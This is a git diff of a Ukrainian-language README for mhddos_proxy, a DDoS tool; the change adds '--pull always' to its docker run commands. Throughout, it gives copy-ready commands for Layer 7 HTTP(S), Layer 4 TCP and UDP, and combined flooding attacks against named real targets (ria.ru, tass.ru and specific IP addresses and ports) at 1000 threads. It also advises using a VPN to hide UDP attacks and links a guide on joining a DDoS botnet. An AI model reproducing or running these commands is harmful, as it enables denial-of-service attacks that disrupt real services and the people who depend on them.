@@ -75,7 +75,7 @@
 **ВАЖЛИВО!** Якщо Docker викидує якусь помилку, спробуйте запустити його кілька разів (може бути таке, що не вдається зразу встановити зв'язок із проксі-серверами через велику їх нагрузку на даний момент). Якщо ж проблема залишається, то спробуйте варіант із Python нижче (бувало таке, що не вдавалося зпулити Docker імедж через його недавнє видалення, або проблеми із серверами GitHub, де цей Docker імедж зараз зберігається).
 
 ```sh
-sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://ria.ru https://tass.ru
+sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://ria.ru https://tass.ru
 ```
 
 ### Python
@@ -111,7 +111,7 @@ python3 runner.py https://ria.ru https://tass.ru
 Взагалі, загальний вигляд команди виглядає так:
 
 ```sh
-sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy <list of targets> -c <config_file> -t <threads> -p <period> <--debug> --rpc <n_requests>  --http-methods <list of http_methods>
+sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy <list of targets> -c <config_file> -t <threads> -p <period> <--debug> --rpc <n_requests>  --http-methods <list of http_methods>
 ```
 
 Одразу ж прошу Вас звернути увагу на параметр -t й експериментально встановити значення для нього для конкретно Вашої машини й Вашого інтернету.
@@ -158,27 +158,27 @@ optional arguments:
 
 * Атака на Layer 7 (HTTP(S) по URL)
   ```sh
-  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://ria.ru https://tass.ru -t 1000 --debug
+  sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://ria.ru https://tass.ru -t 1000 --debug
   ```
 * Атака на Layer 7 (HTTP по IP + PORT)
   ```sh
-  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest 5.188.56.124:80 5.188.56.124:3606 -t 1000 --debug
+  sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest 5.188.56.124:80 5.188.56.124:3606 -t 1000 --debug
   ```
 * Атака на Layer 4 (по TCP адресам)
   ```sh
-  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest tcp://194.54.14.131:4477 tcp://194.54.14.131:22 -t 1000 --debug
+  sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest tcp://194.54.14.131:4477 tcp://194.54.14.131:22 -t 1000 --debug
   ```
 * Атака на Layer 4 (по UDP адресам)
 
   **Необхідно використовувати VPN!!!** Налаштувати його можна за допомогою [ось цього гайду](https://telegra.ph/Prisoedinyaemsya-k-botnetu-dlya-DDoS-ataki-s-ispolzovaniem-dockerprotonVPN-02-27), гортайте нижче.
   ```sh
-  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest udp://217.175.155.100:53 -t 1000 --debug
+  sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest udp://217.175.155.100:53 -t 1000 --debug
   ```
 * Комбінована атака
   ```sh
-  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://ria.ru tcp://194.54.14.131:22 -t 1000 --debug
+  sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://ria.ru tcp://194.54.14.131:22 -t 1000 --debug
   ```
-  
+
 <br/>
 
 ## Пояснення атак
